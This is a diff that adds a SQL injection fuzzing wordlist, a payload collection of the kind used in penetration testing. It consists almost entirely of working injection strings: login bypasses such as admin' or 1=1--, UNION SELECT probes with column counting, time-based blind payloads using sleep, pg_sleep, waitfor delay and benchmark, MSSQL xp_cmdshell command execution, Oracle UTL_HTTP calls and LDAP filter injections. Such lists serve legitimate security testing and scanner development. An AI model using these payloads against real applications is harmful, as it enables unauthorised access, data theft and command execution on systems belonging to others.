@@ -1,0 +1,336 @@
+ OR 1=1
+!
+"
+" "
+" or "" "
+" OR "" = "
+" or ""&"
+" or ""*"
+" or ""-"
+" or ""^"
+" or "a"="a
+" or "x"="x
+" or 0=0 #
+" or 0=0 --
+" OR 1 = 1 -- -
+" or 1=1 or ""="
+" or 1=1--
+" or true--
+""
+"%20or%20"x"="x
+"&"
+"' or 1 --'"
+") or ("a"="a
+") or ("x")=("x
+") or true--
+")) or (("x"))=(("x
+"*"
+"*"'
+"-"
+"--"
+"-||0"
+"^"
+#
+# Numeric
+%		wildcard attribute indicator
+%00
+%20$(sleep%2050)
+%20'sleep%2050'
+%21
+%22
+%23
+%26
+%27
+%27%20or%201=1
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%2c(select%20*%20from%20(select(sleep(10)))a)
+%3B
+%7C
+&
+&apos;%20OR
+&lt;&gt;&quot;'%;)(&amp;+
+'
+' '
+' (select top 1
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+' AND id IS NULL; --
+' AND MID(VERSION(),1,1) = '5';
+' GROUP BY columnnames having 1=1 --
+' or "
+' or '' '
+' OR '' = '
+' or ''&'
+' or ''*'
+' or ''-'
+' or ''='
+' or ''^'
+' OR '1
+' or '1'='1'--
+' or 'x'='x
+' or (EXISTS)
+' or 0=0 #
+' or 0=0 --
+' OR 1 -- -
+' or 1=1 limit 1 -- -+
+' or 1=1 or ''='
+' or 1=1--
+' or a=a--
+' or true--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+' UNION ALL SELECT
+' UNION SELECT
+' UNION SELECT sum(columnname ) from tablename --
+'%20--
+'%20;
+'%20or%20''='
+'%20or%20'x'='x
+'%20or%201=1
+'&'
+''
+'''''''''''''UNION SELECT '2
+') or ('a'='a
+') or ('x')=('x
+') or true--
+')%20or%20('x'='x
+')) or (('x'))=(('x
+'*'
+'-'
+'--'
+'--' / "--"
+'-||0'
+'; exec master..xp_cmdshell
+'; exec xp_regread
+';WAITFOR DELAY '0:0:30'--
+'="or'
+'='
+'=0--+
+'hi' or 'x'='x';
+'LIKE'
+'or%20select *
+'or''='
+'sqlattempt1
+'^'
+'||UTL_HTTP.REQUEST
+(
+(sqlattempt2)
+)
+*(|(mail=*))
+*(|(objectclass=*))
+*/*
+*|
++		addition, concatenate (or space in url)
+++++++++++++++
+,
+,(select * from (select(sleep(10)))a)
+,@variable
+-
+--
+-- or # 
+--';
+--sp_password
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+-1' UNION SELECT 1,2,3--+
+-2
+/
+/*…*/ 
+//
+//*
+0 or 1=1
+1
+1 AND (SELECT * FROM Users) = 1	
+1 or 1=1
+1"
+1'
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+1' or '1'='1
+1' ORDER BY 1,2,3--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1'||'asd'||'
+1*56
+1-false
+1-true
+1/*!1111'*/
+1/*'*/
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1;SELECT%20*
+1\
+1`
+;
+<>"'%;)(&+
+=%20'
+=%20--
+=%20;
+@@variable	global variable
+@variable	local variable
+@variable
+admin" #
+admin" --
+admin" or "1"="1
+admin" or "1"="1"#
+admin" or "1"="1"--
+admin" or "1"="1"/*
+admin" or 1=1
+admin" or 1=1#
+admin" or 1=1--
+admin" or 1=1/*
+admin") or "1"="1
+admin") or "1"="1"#
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin") or ("1"="1
+admin") or ("1"="1"#
+admin") or ("1"="1"--
+admin") or ("1"="1"/*
+admin"/*
+admin"or 1=1 or ""="
+admin' #
+admin' --
+admin' -- -
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or '2' LIKE '1
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/*
+admin' or 2 LIKE 2#
+admin' or 2 LIKE 2--
+admin') or '1'='1
+admin') or '1'='1'#
+admin') or '1'='1'--
+admin') or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'#
+admin') or ('1'='1'--
+admin') or ('1'='1'/*
+admin') or ('2' LIKE '2
+admin') or ('2' LIKE '2'#
+admin') or ('2' LIKE '2'/*
+admin') or 2 LIKE 2#
+admin') or 2 LIKE 2--
+admin'--
+admin'/*
+admin';-- azer 
+admin'or 1=1 or ''='
+AND 0
+AND 1
+AND false
+AND true
+as
+asc
+bfilename
+char%4039%41%2b%40SELECT
+delete
+desc
+distinct
+exec sp
+exec xp
+Finding the table name
+handler
+having
+hi" or "a"="a
+hi" or 1=1 --
+hi") or ("a"="a
+hi' or 'a'='a
+hi' or 1=1 --
+hi') or ('a'='a
+insert
+like
+limit
+or
+or 0=0 #
+or 0=0 --
+or 1=1
+or 1=1#
+or 1=1--
+or 1=1/*
+or 2 like 2
+or true--
+or%201=1
+or%201=1 --
+order by
+PRINT
+PRINT @@variable
+procedure
+replace
+select
+SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/ FROM some_table WHERE ex = ample
+SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+Time-Based:
+to_timestamp_tz
+truncate
+tz_offset
+update
+x' or 1=1 or 'x'='y
+[1]
+\
+\x23
+\x27
+\x27UNION SELECT
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x3D%20\x27
+\x3D%20\x3B'
+\\
+`
+``
+|
+||
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
